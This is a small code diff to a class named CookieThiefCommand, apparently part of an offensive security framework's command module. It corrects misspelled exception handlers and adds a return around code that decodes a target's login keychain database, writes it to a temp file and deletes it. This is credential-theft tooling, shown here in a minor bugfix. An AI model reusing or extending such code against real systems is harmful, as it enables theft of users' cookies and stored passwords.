@@ -68,14 +68,15 @@ class CookieThiefCommand(CommandBase):
             f = open("tmp_login.keychain-db", "wb")
             f.write(base64.b64decode(getkeychainDBResp["contents"]))
             f.close()
-        except execption as e:
+        except Exception as e:
             print("Encountered an error attempting to write the keychainDB to a file: " + e)
             sys.stdout.flush()
 
         try:
             os.remove('./tmp_login.keychain-db')
-        except exception as e:
+        except Exception as e:
             print("Encountered an error attempting to removing the temporary keychainDB file: " + e)
             sys.stdout.flush()
+            return task
 
         return task
